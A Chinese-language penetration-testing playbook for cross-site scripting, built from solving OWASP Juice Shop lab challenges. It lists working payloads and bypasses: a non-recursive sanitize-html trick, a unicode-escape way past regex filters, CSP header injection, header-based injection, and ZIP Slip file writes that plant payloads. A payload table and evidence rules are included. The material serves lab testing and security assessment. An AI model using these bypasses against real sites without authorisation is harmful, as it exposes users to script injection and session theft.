---
name: xss-injection
category: xss
source: 渗透/juice-shop-closeout/patterns/ssrf-ssti.md
verified_in: [juice-shop-xss-9challenges]
src_value: high
severity_ceiling: critical
requires_auth: false
payload_count: 6
---

# XSS 验证剧本（服务端判定 + 绕过实战）

> 来源：OWASP Juice Shop 20.1.1 九连测（2026-08-23）。覆盖持久化/反射/DOM/存储型 XSS 的服务端判定绕过。
> **实测记录**：restfulXss（POST /api/Products description）、persistedXssUser（注册 email）、reflectedXss（track-order id）、httpHeaderXss（True-Client-IP 头）、usernameXss（CSP 注入 + RegEx 绕过）、persistedXssFeedback（sanitize-html 1.4.2 非递归净化绕过）、localXss/xssBonus（socket.io 事件直发）、videoXss（ZIP Slip 写字幕）——9/9 ✅

## 0. 靶场实测要点（先读）

- **sanitize-html <2.x 非递归净化绕过**（persistedXssFeedback 实测）：`<<script>Foo</script>iframe src="javascript:alert(`xss`)">` —— 首 `<` 成文本，`<script>` 触发 raw-text 丢弃，闭合后残留文本与首 `<` 拼出完整 `<iframe ...>`。**先查 package.json 的 sanitize 版本再决定 payload 路线**
- **homegrown RegEx sanitizer 用 `\u003c` 转义绕过**（usernameXss 实测）：`<(?:\w+)\W+?[\w]` 类正则只认字面 `<`——存储 `#{'\u003cscript>...'}`，渲染时 eval/模板引擎解码还原完整标签
- **CSP 注入联动**：profileImage 可控时注入 `'; script-src 'unsafe-inline'` 改写 CSP 头（`/[ ;]*script-src(.)*'unsafe-inline'/` 判定）
- **头注入先确认头名**（httpHeaderXss 实测）：`True-Client-IP` 头（不是 User-Agent）——先读源码确认读取的头字段再注入
- **前端判定挑战可 socket.io 直发**（localXss/xssBonus 实测）：前端 `socket.emit('verifyLocalXssChallenge', payload)` → 服务端事件处理器判定——**无需浏览器**，socket.io-client 直连发射即解锁；Bonus payload 在 config `challenges.xssBonusPayload`
- **文件写入联动**（videoXss 实测）：ZIP 上传 ZIP Slip（`../../frontend/dist/...` 站内路径）可写任意站内文件——字幕/模板文件注入 payload 后访问渲染页触发判定；同接口另一条目写 `ftp/legal.md` 解锁 fileWrite
- **验证 CAPTCHA 类接口**：提交前先 GET `/rest/captcha`（响应自带答案）再 POST，避免 401

## 1. 识别

1. 找输入点：评论/反馈/注册字段/搜索参数/HTTP 头/文件上传名
2. 按存储位置分类：服务端持久化（DB）| 反射（响应原样）| DOM（前端渲染）
3. 观察过滤链：无过滤 → RegEx 过滤（homegrown）→ 完整 sanitizer（sanitize-html 等）
4. 选绕过：无过滤直接用；RegEx 用转义/双写；sanitizer 查版本找已知 CVE/非递归缺陷

## 2. Payload 速查

| 场景 | Payload |
|------|---------|
| 通用持久化 | `<iframe src="javascript:alert(`xss`)">` |
| sanitize-html <2.x | `<<script>Foo</script>iframe src="javascript:alert(`xss`)">` |
| RegEx 过滤 | `#{'\u003cscript>alert(`xss`)</script>'}`（配合 eval/模板） |
| 视频/字幕 | `</script><script>alert(`xss`)</script>` |
| DOM 搜索 | 前端 `bypassSecurityTrustHtml` 渲染 q 参数 → iframe payload |

## 3. 判定与取证

- 服务端判定：响应 200/201 + 挑战/业务状态变化（如 modified>1、solved=true）
- 持久化验证：重新 GET 目标资源，响应含**字面 payload**（实体编码不算数）
- 取证：payload、请求、响应三件套存入 evidence/<挑战>/ 目录

## 4. 证据要求

按 `evidence-record.md`：
- 基线请求 + XSS payload 请求完整对照
- 响应摘录显示持久化存储值（字面 payload 在数据库/页面回显）
- 绕过类证据附 sanitizer 版本（package.json 摘录）与绕过原理说明

## 5. SRC 适用边界

- 适用：任何用户输入持久化/反射的 Web 应用（评论、反馈、注册字段、搜索、头注入）
- 不适用：纯静态站、无渲染输出的 API-only 后端
- ⚠️ 敏感操作：存储型 XSS 只做证明（alert/iframe 最小载荷），不植入窃密脚本；头注入注意响应头覆盖范围
